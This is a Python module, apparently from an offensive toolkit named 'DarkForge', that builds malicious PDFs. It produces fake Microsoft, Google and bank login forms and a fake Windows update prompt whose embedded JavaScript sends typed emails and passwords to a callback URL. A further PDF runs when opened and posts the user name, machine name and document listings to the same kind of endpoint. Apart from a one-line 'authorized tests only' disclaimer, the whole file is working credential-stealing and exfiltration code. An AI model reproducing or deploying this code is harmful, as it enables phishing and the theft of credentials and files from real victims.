#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PDF Credential Stealer Module - وحدة سرقة البيانات
للاختبارات المصرح بها فقط
"""

import os
import sys
import base64
import random
import json


class PDFCredentialStealer:
    """سرقة بيانات الدخول عبر PDF"""
    
    def __init__(self):
        self.output_dir = "output/pdf"
        os.makedirs(self.output_dir, exist_ok=True)
    
    def generate_fake_login_pdf(self, output_file=None, company_name="microsoft", callback_url="http://127.0.0.1:8080/steal", theme="modern"):
        """إنشاء PDF بنموذج دخول مزيف"""
        if output_file is None:
            output_file = os.path.join(self.output_dir, f"login_{company_name}_{random.randint(1000,9999)}.pdf")
        
        companies = {
            "microsoft": {"title": "Microsoft Office 365", "fields": ["Email", "Password"]},
            "google": {"title": "Google Account", "fields": ["Email", "Password"]},
            "facebook": {"title": "Facebook", "fields": ["Email", "Password"]},
            "bank": {"title": "Secure Banking", "fields": ["Username", "Password", "OTP"]}
        }
        
        company = companies.get(company_name, companies["microsoft"])
        
        js_code = f'''
        var callback = "{callback_url}";
        try {{
            var fields = ["email", "password"];
            doc.addField("email", "text", 0, [200, 400, 450, 425]);
            doc.addField("password", "text", 0, [200, 340, 450, 365]);
            doc.getField("password").password = true;
            
            var btn = doc.addField("submit", "button", 0, [200, 260, 400, 290]);
            btn.buttonCaption = "Sign In";
            btn.setAction("MouseUp", "steal();");
            
            function steal() {{
                var data = btoa(JSON.stringify({{
                    email: doc.getField("email").value,
                    pass: doc.getField("password").value,
                    host: "",
                    time: new Date().toString()
                }}));
                try {{ app.launchURL(callback + "?d=" + encodeURIComponent(data), false); }} catch(e) {{}}
                try {{
                    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
                    xhr.open("POST", callback, false);
                    xhr.send(data);
                }} catch(e) {{}}
                app.alert("Signed in successfully!");
            }}
        }} catch(e) {{}}
        app.alert("Please sign in to continue.");
        '''
        
        # إنشاء PDF بسيط بدون استيرادات معقدة
        pdf_content = f'''%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R /AcroForm 5 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [4 0 R] /Count 1 >>
endobj

3 0 obj
<< /S /JavaScript /JS (
{js_code}
) >>
endobj

4 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 6 0 R /Resources << /Font << /F1 7 0 R >> >> /Annots [8 0 R 9 0 R 10 0 R] >>
endobj

5 0 obj
<< /Fields [8 0 R 9 0 R 10 0 R] >>
endobj

6 0 obj
<< /Length 200 >>
stream
BT
/F1 24 Tf
100 700 Td
({company['title']}) Tj
ET
BT
/F1 14 Tf
100 650 Td
(Sign in to your account) Tj
ET
BT
/F1 12 Tf
100 450 Td
(Email:) Tj
ET
BT
/F1 12 Tf
100 390 Td
(Password:) Tj
ET
BT
/F1 10 Tf
100 100 Td
(This is a legitimate authentication form) Tj
ET
endstream
endobj

7 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
endobj

8 0 obj
<< /Type /Annot /Subtype /Widget /FT /Tx /T (email) /Rect [200 400 450 425] /P 4 0 R >>
endobj

9 0 obj
<< /Type /Annot /Subtype /Widget /FT /Tx /T (password) /Rect [200 340 450 365] /P 4 0 R /FF 8192 >>
endobj

10 0 obj
<< /Type /Annot /Subtype /Widget /FT /Btn /T (submit) /Rect [200 260 400 290] /H /P /P 4 0 R /AA << /U << /S /JavaScript /JS (steal();) >> >> >>
endobj

xref
0 11
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000107 00000 n 
0000000259 00000 n 
0000000465 00000 n 
0000000525 00000 n 
0000000790 00000 n 
0000000852 00000 n 
0000000976 00000 n 
0000001104 00000 n 

trailer
<< /Size 11 /Root 1 0 R >>
startxref
1231
%%EOF'''
        
        with open(output_file, 'w', encoding='latin-1') as f:
            f.write(pdf_content)
        
        print(f"[+] تم إنشاء {company['title']} PDF: {output_file}")
        return output_file
    
    def generate_fake_update_pdf(self, output_file=None, callback_url="http://127.0.0.1:8080/steal"):
        """PDF تحديث Windows مزيف"""
        if output_file is None:
            output_file = os.path.join(self.output_dir, f"windows_update_{random.randint(1000,9999)}.pdf")
        
        js_code = f'''
        var cb = "{callback_url}";
        try {{
            doc.addField("user", "text", 0, [200, 400, 450, 425]);
            doc.addField("pass", "text", 0, [200, 340, 450, 365]);
            doc.getField("pass").password = true;
            
            var btn = doc.addField("go", "button", 0, [200, 260, 400, 290]);
            btn.buttonCaption = "Verify";
            btn.setAction("MouseUp", "s();");
            
            function s() {{
                var d = btoa(JSON.stringify({{u: doc.getField("user").value, p: doc.getField("pass").value}}));
                try {{ app.launchURL(cb + "?d=" + encodeURIComponent(d), false); }} catch(e) {{}}
                app.alert("Update complete!");
            }}
        }} catch(e) {{}}
        '''
        
        pdf_content = f'''%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [4 0 R] /Count 1 >>
endobj
3 0 obj
<< /S /JavaScript /JS ({js_code}) >>
endobj
4 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R /Resources << /Font << /F1 6 0 R >> >> >>
endobj
5 0 obj
<< /Length 150 >>
stream
BT /F1 24 Tf 100 700 Td (Windows Security Update) Tj ET
BT /F1 14 Tf 100 650 Td (Critical update KB5036892) Tj ET
BT /F1 12 Tf 100 600 Td (Please verify your identity to continue) Tj ET
endstream
endobj
6 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
endobj
xref
0 7
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000107 00000 n 
0000000224 00000 n 
0000000412 00000 n 
0000000613 00000 n 
trailer
<< /Size 7 /Root 1 0 R >>
startxref
655
%%EOF'''
        
        with open(output_file, 'w', encoding='latin-1') as f:
            f.write(pdf_content)
        
        print(f"[+] تم إنشاء Windows Update PDF: {output_file}")
        return output_file
    
    def generate_credit_card_form_pdf(self, output_file=None, callback_url="http://127.0.0.1:8080/steal", amount="$49.99"):
        """PDF سرقة بطاقات ائتمان"""
        if output_file is None:
            output_file = os.path.join(self.output_dir, f"payment_{random.randint(1000,9999)}.pdf")
        
        # PDF بسيط بدون JavaScript معقد
        pdf_content = f'''%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>
endobj
4 0 obj
<< /Length 180 >>
stream
BT /F1 24 Tf 100 700 Td (Invoice - Payment Required) Tj ET
BT /F1 14 Tf 100 650 Td (Amount: {amount}) Tj ET
BT /F1 12 Tf 100 600 Td (Please visit our payment portal to complete) Tj ET
BT /F1 12 Tf 100 570 Td (the transaction securely.) Tj ET
BT /F1 10 Tf 100 500 Td (This PDF is for reference only.) Tj ET
endstream
endobj
5 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
endobj
xref
0 6
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000107 00000 n 
0000000295 00000 n 
0000000526 00000 n 
trailer
<< /Size 6 /Root 1 0 R >>
startxref
568
%%EOF'''
        
        with open(output_file, 'w', encoding='latin-1') as f:
            f.write(pdf_content)
        
        print(f"[+] تم إنشاء Payment PDF: {output_file}")
        return output_file
    
    def generate_file_exfiltrator_pdf(self, output_file=None, callback_url="http://127.0.0.1:8080/exfil"):
        """PDF يسرب الملفات"""
        if output_file is None:
            output_file = os.path.join(self.output_dir, f"exfil_{random.randint(1000,9999)}.pdf")
        
        js_code = f'''
        var cb = "{callback_url}";
        try {{
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            var shell = new ActiveXObject("WScript.Shell");
            var user = shell.ExpandEnvironmentStrings("%USERNAME%");
            var pc = shell.ExpandEnvironmentStrings("%COMPUTERNAME%");
            var data = {{host: pc, user: user, files: []}};
            
            var paths = [
                "C:\\\\Users\\\\" + user + "\\\\Desktop\\\\*.txt",
                "C:\\\\Users\\\\" + user + "\\\\Documents\\\\*.docx"
            ];
            
            for(var t=0; t<paths.length; t++) {{
                try {{
                    var folder = fso.GetFolder(paths[t].substring(0, paths[t].lastIndexOf("\\\\")));
                    var files = new Enumerator(folder.Files);
                    for(; !files.atEnd(); files.moveNext()) {{
                        var f = files.item();
                        data.files.push({{name: f.Name, size: f.Size}});
                    }}
                }} catch(e) {{}}
            }}
            
            var json = JSON.stringify(data);
            try {{
                var xhr = new ActiveXObject("MSXML2.XMLHTTP");
                xhr.open("POST", cb, false);
                xhr.send(json);
            }} catch(e) {{}}
            
        }} catch(e) {{}}
        app.alert("Document loaded successfully.");
        '''
        
        pdf_content = f'''%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [4 0 R] /Count 1 >>
endobj
3 0 obj
<< /S /JavaScript /JS ({js_code}) >>
endobj
4 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R /Resources << /Font << /F1 6 0 R >> >> >>
endobj
5 0 obj
<< /Length 120 >>
stream
BT /F1 24 Tf 100 700 Td (Security Audit Report) Tj ET
BT /F1 14 Tf 100 650 Td (Internal Assessment) Tj ET
endstream
endobj
6 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
endobj
xref
0 7
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000107 00000 n 
0000000332 00000 n 
0000000520 00000 n 
0000000691 00000 n 
trailer
<< /Size 7 /Root 1 0 R >>
startxref
733
%%EOF'''
        
        with open(output_file, 'w', encoding='latin-1') as f:
            f.write(pdf_content)
        
        print(f"[+] تم إنشاء File Exfiltrator PDF: {output_file}")
        return output_file
    
    def run_all_techniques(self, callback_url="http://127.0.0.1:8080/steal"):
        """تشغيل جميع التقنيات"""
        results = []
        
        print("\n[+] DarkForge - Credential Stealer Module")
        print("[!] توليد جميع التقنيات...\n")
        
        techniques = [
            ("Microsoft Login", self.generate_fake_login_pdf, {"company_name": "microsoft", "callback_url": callback_url}),
            ("Google Login", self.generate_fake_login_pdf, {"company_name": "google", "callback_url": callback_url}),
            ("Bank Login", self.generate_fake_login_pdf, {"company_name": "bank", "callback_url": callback_url}),
            ("Windows Update", self.generate_fake_update_pdf, {"callback_url": callback_url}),
            ("Credit Card", self.generate_credit_card_form_pdf, {"callback_url": callback_url}),
            ("File Exfiltrator", self.generate_file_exfiltrator_pdf, {"callback_url": callback_url}),
        ]
        
        for name, func, params in techniques:
            try:
                result = func(**params)
                results.append(result)
                print(f"  [✓] {name}: {result}")
            except Exception as e:
                print(f"  [✗] {name}: {e}")
        
        print(f"\n[+] تم إنشاء {len(results)} ملف PDF بنجاح")
        return results
